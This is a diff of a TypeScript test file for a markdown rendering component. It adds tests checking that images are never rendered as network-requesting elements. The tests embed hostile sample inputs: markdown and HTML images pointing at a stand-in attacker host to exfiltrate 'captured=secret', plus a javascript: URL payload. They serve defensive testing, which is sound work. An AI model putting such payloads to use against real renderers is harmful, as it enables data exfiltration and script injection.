@@ -75,9 +75,21 @@ describe("MarkdownProse", () => {
     expect(link?.getAttribute("href") ?? "").not.toContain("javascript:");
   });
 
-  it("strips javascript: and data: URLs from markdown images", async () => {
-    const container = await mountMarkdown("![x](javascript:window.__markdown_pwned=true)");
-    const image = container.querySelector("img");
-    expect(image?.getAttribute("src") ?? "").not.toContain("javascript:");
+  it("never renders images: markdown img emits no element that could fire a network request", async () => {
+    // Captured traffic is attacker-controlled; an <img> would auto-request
+    // the remote URL and exfiltrate data. The image renders as inert code.
+    const container = await mountMarkdown("![tracking pixel](https://attacker.example/pixel?captured=secret)");
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelectorAll("[src]")).toHaveLength(0);
+    // The URL stays visible as text so no information is lost.
+    expect(container.querySelector("code.md-img")?.textContent).toContain("https://attacker.example/pixel?captured=secret");
+    expect(container.querySelector("code.md-img")?.textContent).toContain("tracking pixel");
+  });
+
+  it("keeps reference-style and html-ish image payloads inert too", async () => {
+    const container = await mountMarkdown('![x](javascript:window.__markdown_pwned=true) <img src="https://attacker.example/p2">');
+    expect(container.querySelector("img")).toBeNull();
+    expect(container.querySelectorAll("[src]")).toHaveLength(0);
+    expect((globalThis as unknown as Record<string, unknown>).__markdown_pwned).toBeUndefined();
   });
 });
